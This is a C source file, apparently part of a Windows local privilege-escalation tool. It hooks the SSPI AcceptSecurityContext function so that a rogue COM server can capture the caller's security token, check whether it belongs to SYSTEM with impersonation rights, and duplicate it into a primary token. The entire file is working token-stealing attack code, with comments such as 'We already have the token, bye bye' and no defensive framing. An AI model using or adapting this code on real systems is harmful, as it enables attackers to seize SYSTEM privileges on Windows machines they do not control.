#define SECURITY_WIN32 
#pragma comment(lib, "Secur32.lib")

#include "Windows.h"
#include "stdio.h"
#include "sspi.h"
#include "SSPIHooks.h"

// global vars used
extern HANDLE g_hEventTokenStolen;
extern HANDLE g_hEventAuthTriggered;
extern HANDLE g_hTokenStolenPrimary;
extern HANDLE g_hTokenStolenSecondary;
extern BOOL g_SystemTokenStolen;
wchar_t* g_Clsid;

int IsTokenSystem(HANDLE tok, wchar_t* clsid);

SECURITY_STATUS AcceptSecurityContextHook(PCredHandle phCredential, PCtxtHandle phContext, PSecBufferDesc pInput, ULONG fContextReq, ULONG TargetDataRep, PCtxtHandle phNewContext, PSecBufferDesc pOutput, PULONG pfContextAttr, PTimeStamp ptsTimeStamp) {
	SECURITY_STATUS status;
	if(g_hTokenStolenSecondary != NULL)
		return SEC_E_INTERNAL_ERROR; // We already have the token, bye bye
	status = AcceptSecurityContext(phCredential, phContext, pInput, fContextReq, TargetDataRep, phNewContext, pOutput, pfContextAttr, ptsTimeStamp);
	if (phContext != NULL) { // we should land here in the 2nd call to AcceptSecurityContext, so context should be created in our com server <-- this process
		SetEvent(g_hEventAuthTriggered);
		QuerySecurityContextToken(phContext, &g_hTokenStolenSecondary);
		if (IsTokenSystem(g_hTokenStolenSecondary, g_Clsid)) {
			DuplicateTokenEx(g_hTokenStolenSecondary, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &g_hTokenStolenPrimary);
			g_SystemTokenStolen = TRUE;
		}
		SetEvent(g_hEventTokenStolen);
	}
	return status;
}

void HookSSPIForTokenStealing(wchar_t *clsid) {
	g_Clsid = clsid;
	g_hTokenStolenPrimary = NULL;
	g_hTokenStolenSecondary = NULL;
	g_SystemTokenStolen = FALSE;
	PSecurityFunctionTableW table = InitSecurityInterfaceW();
	table->AcceptSecurityContext = AcceptSecurityContextHook;
}

int IsTokenSystem(HANDLE hToken, wchar_t *clsid)
{
	DWORD Size, UserSize, DomainSize;
	SID* sid;
	SID_NAME_USE SidType;
	TCHAR UserName[64], DomainName[64];
	TOKEN_USER* User;
	SECURITY_IMPERSONATION_LEVEL ImpersonationLevel = SecurityAnonymous;
	wchar_t* impersonationLevelstr = NULL;

	Size = 0;
	GetTokenInformation(hToken, TokenUser, NULL, 0, &Size);
	if (!Size)
		return FALSE;
	User = (TOKEN_USER*)malloc(Size);
	GetTokenInformation(hToken, TokenUser, User, Size, &Size);
	Size = GetLengthSid(User->User.Sid);
	sid = (SID*)malloc(Size);
	CopySid(Size, sid, User->User.Sid);
	UserSize = (sizeof UserName / sizeof * UserName) - 1;
	DomainSize = (sizeof DomainName / sizeof * DomainName) - 1;
	LookupAccountSid(NULL, sid, UserName, &UserSize, DomainName, &DomainSize, &SidType);
	//free(sid);
	//free(User);

	Size = 0;
	GetTokenInformation(hToken, TokenImpersonationLevel, &ImpersonationLevel, sizeof(SECURITY_IMPERSONATION_LEVEL), &Size);
	switch (ImpersonationLevel)
	{
	case SecurityAnonymous:
		impersonationLevelstr = (wchar_t*)L"Anonymous";
		break;
	case SecurityIdentification:
		impersonationLevelstr = (wchar_t*)L"Identification";
		break;
	case SecurityImpersonation:
		impersonationLevelstr = (wchar_t*)L"Impersonation";
		break;
	case SecurityDelegation:
		impersonationLevelstr = (wchar_t*)L"Delegation";
		break;
	}

	if (!_wcsicmp(UserName, L"SYSTEM") && ImpersonationLevel >= SecurityImpersonation) {
		printf("[+] authresult success %S;%S\\%S;%S\n", clsid, DomainName, UserName, impersonationLevelstr);
		return 1;
	}
	else {
		printf("[-] authresult failed %S;%S\\%S;%S\n", clsid, DomainName, UserName, impersonationLevelstr);
	}
	fflush(stdout);
	return 0;
}